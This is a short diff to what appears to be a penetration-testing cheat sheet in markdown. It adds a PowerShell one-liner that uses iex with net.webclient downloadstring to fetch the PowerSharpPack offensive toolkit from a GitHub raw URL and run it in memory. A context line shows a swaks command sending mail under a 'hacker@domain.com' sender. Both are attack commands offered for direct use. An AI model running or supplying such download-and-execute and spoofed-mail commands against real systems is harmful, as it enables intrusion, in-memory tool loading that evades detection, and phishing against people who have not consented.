@@ -968,3 +968,8 @@ Send mail with swaks
 ```shell
 swaks --to w@domain.com --server 192.168.1.1 --body "Hello" --header "Subject: Issues"  --from hacker@domain.com
 ```
+
+PowerSharpPack
+```
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
+```
